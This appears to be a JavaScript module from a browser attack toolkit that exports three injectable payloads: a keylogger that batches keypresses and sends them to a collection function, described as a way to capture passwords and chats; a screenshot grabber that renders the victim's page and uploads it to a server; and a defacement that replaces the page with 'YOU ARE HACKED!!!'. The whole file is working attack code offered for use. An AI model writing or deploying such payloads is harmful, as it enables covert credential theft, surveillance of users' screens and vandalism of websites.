const utils = [
  {
    name: "Key Strokes",
    description: "You will get the keystrokes pressed by the user.\nCan be used when you want to track passwords or chat of a user.",
    func: () => {
      let characters = [];
      function debounce(f, wait) {
        let timerId = null;
        return function (...args) {
          clearTimeout(timerId);
          timerId = setTimeout(() => f.apply(this, args), wait);
        }
      }

      const sendNewData = debounce(async (data) => {
        await sendData(data);
        characters = [];
      }, 1000)

      document.addEventListener("keypress", async (event) => {
        characters.push(event.key)
        sendNewData(characters.join(""));
      })
    }
  },



  {
    name: "Screenshot",
    description: "Takes the screenshot of the user's browser screen (whatever they are looking at), and saves it in your system. Works WITHOUT ANY PERMISSIONS!!!",
    func: () => {


      function dataURItoBlob(dataURI) {
        // convert base64/URLEncoded data component to raw binary data held in a string
        var byteString;
        if (dataURI.split(',')[0].indexOf('base64') >= 0)
          byteString = atob(dataURI.split(',')[1]);
        else
          byteString = unescape(dataURI.split(',')[1]);

        // write the bytes of the string to a typed array
        var ia = new Uint8Array(byteString.length);
        for (var i = 0; i < byteString.length; i++) {
          ia[i] = byteString.charCodeAt(i);
        }

        return new Blob([ia], { type: "image/png" });
      }


      html2canvas(document.body, {
        allowTaint: true,
        useCORS: true,
      })
        .then(async function (canvas) {
          // It will return a canvas element
          // DOMAIN
          const domain = "http://localhost:3000/";

          const blob = await (new Promise((resolve, reject) => {
            canvas.toBlob(file => {
              resolve(file)
            }, 'image/png')
          }));

          console.log(blob);

          var form_data = new FormData();
          form_data.append("screenshot", blob, "ss.png");
          form_data.set("filename", "ss.png")

          await fetch(`${domain}screenshots`, {
            method: 'POST', // or 'PUT'
            body: form_data,
          })
        })
        .catch((e) => {
          // Handle errors
          console.log(e);
        });
    }
  },



  {
    name: "Terror",
    description: "Erase page to show `YOU ARE HACKED!!!`",
    func: () => {
      document.body.innerHTML = "<h1 style='color: red; font-size: 150px; text-align: center;'>YOU ARE HACKED!!!</h1>"
    }
  }

]

module.exports = utils
